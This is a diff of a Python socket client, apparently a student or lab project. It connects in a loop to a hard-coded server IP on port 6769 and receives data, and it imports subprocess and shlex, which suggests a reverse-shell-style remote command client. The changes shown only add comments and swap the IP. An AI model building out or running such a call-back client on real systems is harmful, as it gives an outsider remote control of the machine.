@@ -1,3 +1,8 @@
+"""
+Adam Braccia
+client file
+"""
+#Imports
 import socket
 import subprocess
 import shlex
@@ -12,7 +17,8 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-SERVER = "192.168.193.113"  # Your server IP
+# Comnect to server's IP and target Port
+SERVER = "192.168.200.197"  # Your server IP
 PORT = 6769
 END_MARKER = b"\n--END--\n"
 
@@ -58,10 +64,12 @@ def connect_to_server():
 def main():
     while True:
         try:
+            #Initial connection to server
             with connect_to_server() as s:
                 buffer = b""
                 while True:
                     try:
+                        #recieve data if connected
                         chunk = s.recv(4096)
                         if not chunk:
                             logger.warning("Server closed connection")
